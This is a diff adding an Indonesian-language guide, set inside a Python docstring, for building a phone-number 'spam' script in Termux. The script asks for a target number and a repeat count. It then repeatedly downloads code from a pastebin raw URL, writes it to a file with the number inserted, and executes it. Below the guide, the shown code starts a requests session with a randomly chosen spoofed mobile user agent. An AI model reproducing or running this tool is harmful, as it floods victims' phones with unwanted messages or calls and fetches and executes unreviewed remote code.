@@ -1,4 +1,34 @@
 
+'''
+• CARA MEMBUAT SCRIPT SPAMNYA •
+
+- Buka Termux Lalu Ketik
+
+nano contoh.py
+
+- Kemudian Enter
+
+import os,requests
+os.system('clear')
+print ('MASUKAN NOMOR DENGAN AWALAN 8XXX')
+no = input ('MASUKAN NOMOR TARGET : ')
+jum = int(input('MASUKAN JUMLAH SPAM  : '))
+for i in range(jum):
+        req = requests.get('https://pastebin.com/raw/fMAZw2pE').text
+        open ('head.py','w').write('no = "%s" \n %s'%(int(no),req))
+        os.system('python head.py')
+
+- Copy Teks di atas lalu tempel di termux
+- Setelah itu pencet
+ ctrl
+ x
+ y
+- Lalu Enter
+- Jalankan scriptnya dengan cara ketik
+python contoh.py
+
+Dah Jadi^_^
+'''
 import os,requests,json,random
 ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
 req = requests.Session()
